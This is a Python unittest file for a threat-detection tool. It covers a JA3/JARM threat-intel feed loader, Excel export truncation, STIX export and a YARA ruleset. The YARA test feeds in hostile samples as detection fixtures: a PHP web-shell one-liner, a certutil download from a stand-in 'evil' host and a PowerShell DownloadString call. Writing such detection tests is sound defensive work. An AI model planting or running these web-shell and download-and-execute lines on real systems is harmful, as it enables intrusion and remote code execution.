"""Threat-intel loader, Excel export limits, and YARA ruleset tests."""

import csv
import shutil
import tempfile
import unittest
from pathlib import Path

import modules.excel_export as excel_export
import modules.threat_intel as threat_intel
from modules import https_metadata, jarm

REPO_ROOT = Path(__file__).resolve().parent.parent


class TestThreatIntelLoader(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.d, ignore_errors=True)

    def test_abusech_and_simple_formats(self):
        (self.d / "ja3_feed.csv").write_text(
            "# ja3_md5,first_seen,last_seen,reason\n"
            "fingerprint\n"  # header junk, too short -> skipped
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,2020-01-01 00:00:00,2020-02-01 00:00:00,FeedMalware\n"
        )
        (self.d / "jarm_feed.csv").write_text(
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccc,My C2,src\n"
        )
        counts = threat_intel.load_intel_feeds(self.d)
        self.assertEqual(counts["ja3"], 1)
        self.assertEqual(counts["jarm"], 1)
        self.assertEqual(
            https_metadata.KNOWN_MALICIOUS_JA3.get("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
            ("FeedMalware", "ja3_feed.csv"),
        )
        self.assertIn(
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccc",
            jarm.KNOWN_MALICIOUS_JARM,
        )

    def test_missing_dir_returns_zero(self):
        counts = threat_intel.load_intel_feeds(self.d / "nope")
        self.assertEqual(counts, {"ja3": 0, "ja4": 0, "jarm": 0})


class TestExcelRowLimit(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self._orig = excel_export._EXCEL_MAX_ROWS

    def tearDown(self):
        excel_export._EXCEL_MAX_ROWS = self._orig
        shutil.rmtree(self.d, ignore_errors=True)

    def test_oversized_sheet_truncated_with_marker(self):
        try:
            import openpyxl  # noqa: F401
        except ImportError:
            self.skipTest("openpyxl not installed")
        with open(self.d / "alerts.csv", "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["a", "b"])
            for i in range(12):
                w.writerow([f"r{i}", f"v{i}"])
        excel_export._EXCEL_MAX_ROWS = 6  # simulate the Excel limit
        path = excel_export.build_excel_workbook(self.d)
        self.assertIsNotNone(path)
        import openpyxl
        ws = openpyxl.load_workbook(path)["alerts"]
        self.assertEqual(ws.max_row, 6)  # header + 4 data + marker
        self.assertIn("omitted", str(ws.cell(row=6, column=1).value))


class TestStixRelationships(unittest.TestCase):
    def test_malware_sdo_and_relationships(self):
        import json
        from modules.stix_export import export_stix_bundle
        iocs = [
            {"ioc_type": "ja3_fingerprint", "value": "abc123", "confidence": "MEDIUM"},
            {"ioc_type": "ipv4", "value": "45.1.2.3", "confidence": "HIGH"},
        ]
        assoc = {"abc123": "Cobalt Strike", "45.1.2.3": "Cobalt Strike"}
        bundle = json.loads(export_stix_bundle(iocs, malware_associations=assoc))
        objs = bundle["objects"]
        malware = [o for o in objs if o["type"] == "malware"]
        rels = [o for o in objs if o["type"] == "relationship"]
        self.assertEqual(len(malware), 1)              # deduped family
        self.assertTrue(malware[0]["is_family"])
        self.assertEqual(len(rels), 2)
        self.assertTrue(all(r["relationship_type"] == "indicates" for r in rels))

    def test_no_associations_no_malware(self):
        import json
        from modules.stix_export import export_stix_bundle
        bundle = json.loads(export_stix_bundle(
            [{"ioc_type": "domain", "value": "x.com", "confidence": "LOW"}]))
        self.assertFalse(any(o["type"] in ("malware", "relationship")
                             for o in bundle["objects"]))


class TestYaraRuleset(unittest.TestCase):
    def setUp(self):
        try:
            import yara  # noqa: F401
        except ImportError:
            self.skipTest("yara not installed")
        import yara
        self.rules = yara.compile(filepath=str(REPO_ROOT / "rules" / "suspicious_strings.yar"))

    def test_ruleset_compiles(self):
        self.assertGreater(len(list(self.rules)), 0)

    def test_known_malicious_samples_match(self):
        samples = [
            b"<?php @eval($_POST['x']);?>",
            b"certutil -urlcache -split -f http://evil/x.exe",
            b"(New-Object Net.WebClient).DownloadString('http://e/a')",
            b"TVqQAAMAAAAEAAAA//8AALgAAAAA",
        ]
        for data in samples:
            self.assertTrue(self.rules.match(data=data), data)

    def test_benign_content_clean(self):
        self.assertEqual(self.rules.match(data=b"<html>normal page</html>"), [])


if __name__ == "__main__":
    unittest.main()
